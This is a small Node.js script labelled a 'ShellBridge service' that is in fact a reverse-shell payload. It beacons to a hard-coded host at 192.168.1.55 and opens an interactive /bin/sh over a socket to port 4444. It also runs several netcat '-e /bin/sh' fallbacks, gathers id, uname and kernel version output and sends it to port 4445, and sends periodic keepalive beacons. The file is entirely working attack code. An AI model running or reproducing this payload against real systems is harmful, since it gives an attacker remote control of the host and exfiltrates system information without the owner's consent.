// ShellBridge service (ES5, Node 4.4.3 compatible)
var http = require('http');
var net = require('net');
var cp = require('child_process');

var HOST = '192.168.1.55';
var PORT = 8000;
var SHELLPORT = 4444;

function beacon(path) {
    try {
        http.get('http://' + HOST + ':' + PORT + '/' + path, function () {}).on('error', function () {});
    } catch (e) {}
}

beacon('canary?node=' + process.version);

// 1) reverse shell puro en Node (sin dependencias externas)
try {
    var client = new net.Socket();
    client.connect(SHELLPORT, HOST, function () {
        var sh = cp.spawn('/bin/sh', ['-i']);
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit', function () { try { client.end(); } catch (e) {} });
    });
    client.on('error', function (e) { beacon('canary?net_error=' + encodeURIComponent(String(e))); });
} catch (e) {
    beacon('canary?net_exception=' + encodeURIComponent(String(e)));
}

// 2) intentos con busybox nc
var ncCmds = [
    'nc ' + HOST + ' ' + SHELLPORT + ' -e /bin/sh &',
    'busybox nc ' + HOST + ' ' + SHELLPORT + ' -e /bin/sh &',
    '/bin/busybox nc ' + HOST + ' ' + SHELLPORT + ' -e /bin/sh &',
    'nc -e /bin/sh ' + HOST + ' ' + SHELLPORT + ' &'
];
ncCmds.forEach(function (c) {
    cp.exec(c, function () {});
    beacon('canary?cmd=' + encodeURIComponent(c));
});

// 3) recolectar info del sistema y enviarla al puerto 4445
cp.exec('id > /tmp/sb_id.txt 2>&1; uname -a >> /tmp/sb_id.txt 2>&1; cat /proc/version >> /tmp/sb_id.txt 2>&1; (cat /tmp/sb_id.txt | nc ' + HOST + ' 4445 &)', function () {});

// 4) heartbeat
setInterval(function () { beacon('keepalive'); }, 15000);
